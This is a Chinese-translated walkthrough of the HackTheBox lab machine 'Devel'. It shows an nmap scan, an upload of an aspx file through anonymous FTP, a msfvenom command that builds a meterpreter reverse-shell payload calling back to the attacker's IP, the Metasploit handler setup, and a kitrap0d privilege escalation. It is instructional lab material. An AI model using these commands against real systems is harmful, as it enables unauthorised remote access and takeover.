<html>
<head>
<title>Devel From HackTheBox</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">从HackTheBox开发</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/devel-from-hackthebox-21c6436acf52?source=collection_archive---------3-----------------------#2022-10-26">https://infosecwriteups.com/devel-from-hackthebox-21c6436acf52?source=collection_archive---------3-----------------------#2022-10-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="31dd" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">Ftp和windows乐趣</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/e1ce10d53cb9dd711d6def1ac28f1c9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YT8p5QT701a_k8PfnYK1yA.png"/></div></div></figure><p id="0505" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">大家好，这是Hac，今天我们将从hackthebox开始开发，这是一个很容易退役的windows box。有一个有趣的立足点，这可能有助于攻击和防御类型的战争游戏，例如黑客盒子战场。所以，不要浪费任何时间，让我们开始黑吧。</p><p id="da31" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们将从快速nmap扫描开始</p><pre class="kg kh ki kj gt ln lo lp lq aw lr bi"><span id="37c7" class="ls lt iq lo b gy lu lv l lw lx">─$ sudo nmap -sC -sV -p- 10.129.108.142 -oA nmap_all --min-rate 10000<br/>[sudo] password for kali: <br/>Starting Nmap 7.93 ( <a class="ae ly" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2022-10-25 02:35 EDT<br/>Nmap scan report for 10.129.108.142<br/>Host is up (0.082s latency).<br/>Not shown: 65533 filtered tcp ports (no-response)<br/>PORT   STATE SERVICE VERSION<br/>21/tcp open  ftp     Microsoft ftpd<br/>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br/>| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client<br/>| 03-17-17  05:37PM                  689 iisstart.htm<br/>|_03-17-17  05:37PM               184946 welcome.png<br/>| ftp-syst: <br/>|_  SYST: Windows_NT<br/>80/tcp open  http    Microsoft IIS httpd 7.5<br/>| http-methods: <br/>|_  Potentially risky methods: TRACE<br/>|_http-server-header: Microsoft-IIS/7.5<br/>|_http-title: IIS7<br/>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><span id="76f1" class="ls lt iq lo b gy lz lv l lw lx">Service detection performed. Please report any incorrect results at <a class="ae ly" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .<br/>Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds</span></pre><p id="b94a" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">所以有两个服务启动并运行ftp &amp; IIS服务器。我们在ftp上有匿名登录，所以让我们检查ftp，因为我们可能会得到一些有趣的信息，如某些东西的明文密码，或者我们可能会上传文件的Ftp，这可能会给我们一个低特权外壳。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/b9a867d55b7283075ffa50ab6f6e8da3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1296/format:webp/1*TJsT-iU4ZRgLbMgBw_u6tw.png"/></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">检查ftp端口21</figcaption></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi mf"><img src="../Images/295846c42e61c62a0eb858a88fc5b0ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1390/format:webp/1*2qctPTgzSQ23NNr48uVZSw.png"/></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">在ftp上上传. txt文件</figcaption></figure><p id="73fd" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我能够上传一个名为“a.txt”的文件，并能够从网络服务器上访问该文件。这意味着我们可以通过上传一个asp文件得到一个外壳。你可能想知道为什么aspx？为什么不是php或者别的什么？这是因为它是一个windows盒子，运行的是微软IIS服务器，默认情况下不支持PHP。通过侦察，我们了解到一个名为“aspnet_client”的目录。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi mg"><img src="../Images/459a7b22b28c8dd088c9f224f707d940.png" data-original-src="https://miro.medium.com/v2/resize:fit:1358/format:webp/1*CtsCNRs-Nl815ya2BfK6hQ.png"/></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">aspnet_client</figcaption></figure><p id="3129" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">检查a.txt以确保我们能够从web服务器访问它。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mh"><img src="../Images/3746b1f6791d2b8a92b10c24460e6324.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EVWhnzyk5srscG0mA5t06g.png"/></div></div></figure><p id="e892" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">现在我试着用msfvenom创建一个revershell，这是我第一次用。asp '扩展，但当上传外壳并试图从web服务器访问它时，我得到一个错误“500内部服务器错误”。所以我试着创建一个有效载荷。aspx "扩展名，它的工作，我得到了一个revershell。</p><pre class="kg kh ki kj gt ln lo lp lq aw lr bi"><span id="fd04" class="ls lt iq lo b gy lu lv l lw lx">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=6969 -f aspx &gt; shell.aspx</span></pre><p id="6ade" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">然后，我将最后的有效载荷上传到ftp服务器上&amp;并试图从web服务器访问它。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi mi"><img src="../Images/1f79522ed211e8fc68d398af26a7604d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1378/format:webp/1*J2pHrTh4gq9zMcsV_-uHng.png"/></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">在ftp上上传shell.aspx</figcaption></figure><p id="2c64" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们需要对msfconsole进行一些设置，以便获得shell。顺便说一句，如果你是1337黑客，你也可以用netcat访问外壳。</p><pre class="kg kh ki kj gt ln lo lp lq aw lr bi"><span id="335e" class="ls lt iq lo b gy lu lv l lw lx">msf6 &gt; use exploit/multi/handler<br/>[*] Using configured payload generic/shell_reverse_tcp<br/>msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp<br/>payload =&gt; windows/meterpreter/reverse_tcp<br/>msf6 exploit(multi/handler) &gt; set LHOST tun0<br/>LHOST =&gt; tun0<br/>msf6 exploit(multi/handler) &gt; set LPORT 6969<br/>LPORT =&gt; 6969<br/>msf6 exploit(multi/handler) &gt; run</span></pre><p id="30a0" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">现在让我们回到web服务器来激活我们的有效载荷。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mj"><img src="../Images/6b6a9269b2bfaa2e37b58493c85411c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*I27L9KbBDhVi_Fpml_pxPw.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">访问shell.aspx</figcaption></figure><p id="fae7" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">还有……我们有一个反转，让我们开始吧</p><figure class="kg kh ki kj gt kk"><div class="bz fp l di"><div class="mk ml l"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/9130c435005b09d44278b40ed422ab51.png" data-original-src="https://miro.medium.com/v2/resize:fit:1370/format:webp/1*FNv3lEWHKON1WYlT1VdUbw.png"/></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">我们找到一个弹壳</figcaption></figure><p id="48a7" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">是时候把我们的特权升级到root，完全pwn这个盒子了。</p><p id="2088" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">让我们从基本的系统枚举开始。通过运行“系统信息”命令，只是探索文件系统寻找密码或任何将提供信息。</p><pre class="kg kh ki kj gt ln lo lp lq aw lr bi"><span id="9367" class="ls lt iq lo b gy lu lv l lw lx">c:\windows\system32\inetsrv&gt;systeminfo<br/>systeminfo</span><span id="9e2f" class="ls lt iq lo b gy lz lv l lw lx">Host Name:                 DEVEL<br/>OS Name:                   Microsoft Windows 7 Enterprise <br/>OS Version:                6.1.7600 N/A Build 7600<br/>OS Manufacturer:           Microsoft Corporation<br/>OS Configuration:          Standalone Workstation<br/>OS Build Type:             Multiprocessor Free<br/>Registered Owner:          babis<br/>Registered Organization:   <br/>Product ID:                55041-051-0948536-86302<br/>Original Install Date:     17/3/2017, 4:17:31 ��<br/>System Boot Time:          25/10/2022, 9:32:47 ��<br/>System Manufacturer:       VMware, Inc.<br/>System Model:              VMware Virtual Platform<br/>System Type:               X86-based PC<br/>Processor(s):              1 Processor(s) Installed.<br/>                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz<br/>BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018<br/>Windows Directory:         C:\Windows<br/>System Directory:          C:\Windows\system32<br/>Boot Device:               \Device\HarddiskVolume1<br/>System Locale:             el;Greek<br/>Input Locale:              en-us;English (United States)<br/>Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul<br/>Total Physical Memory:     3.071 MB<br/>Available Physical Memory: 2.419 MB<br/>Virtual Memory: Max Size:  6.141 MB<br/>Virtual Memory: Available: 5.516 MB<br/>Virtual Memory: In Use:    625 MB<br/>Page File Location(s):     C:\pagefile.sys<br/>Domain:                    HTB<br/>Logon Server:              N/A<br/>Hotfix(s):                 N/A<br/>Network Card(s):           1 NIC(s) Installed.<br/>                           [01]: vmxnet3 Ethernet Adapter<br/>                                 Connection Name: Local Area Connection 4<br/>                                 DHCP Enabled:    Yes<br/>                                 DHCP Server:     10.129.0.1<br/>                                 IP address(es)<br/>                                 [01]: 10.129.108.142<br/>                                 [02]: fe80::84e5:a926:a7b4:20d4<br/>                                 [03]: dead:beef::5005:9eb9:f501:6af<br/>                                 [04]: dead:beef::84e5:a926:a7b4:20d4</span></pre><p id="c498" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">嗯，从“systeminfo”命令的输出中，我们得到了主机名、操作系统版本和系统架构，我们会记下来，因为这可能会有所帮助。所以现在我们来试试“local_exploit_suggester”这是metasploit的一个post模块。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mn"><img src="../Images/320ff6f650094c4ac19765f091806ccc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-iJ8GxdtYyaQem8N5o3lcg.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">本地利用建议器输出</figcaption></figure><p id="40ab" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">首先，我尝试使用“<strong class="kt ir">exploit/windows/local/bypassuac _ eventvwr</strong>”但它失败了，所以，我尝试“<strong class="kt ir">exploit/windows/local/ms10 _ 015 _ kitrap 0d</strong>”它工作了，我能够将我的权限升级到root。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mo"><img src="../Images/5d4bf0e87b76cdb276f3f6561b94fb35.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1c_zJbAPz0FIoWYgHMOEHQ.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">ms10_015_kitrap0d</figcaption></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/ecc42dba5c73bd4edb4a897ec1706c5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1370/format:webp/1*2k8HOcW6wbXkzAcfENJkfA.png"/></div></figure><p id="d214" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">有很多方法可以在这个盒子上找到根，但是这个是最简单的。还有一些“本地利用建议者”的替代品，如<a class="ae ly" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" rel="noopener ugc nofollow" target="_blank">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a>。但是在这篇文章中，我试图保持事情的简单。</p><p id="e67f" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">希望你喜欢:)</p></div><div class="ab cl mp mq hu mr" role="separator"><span class="ms bw bk mt mu mv"/><span class="ms bw bk mt mu mv"/><span class="ms bw bk mt mu"/></div><div class="ij ik il im in"><h2 id="37d4" class="ls lt iq bd mw mx my dn mz na nb dp nc la nd ne nf le ng nh ni li nj nk nl nm bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ly" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>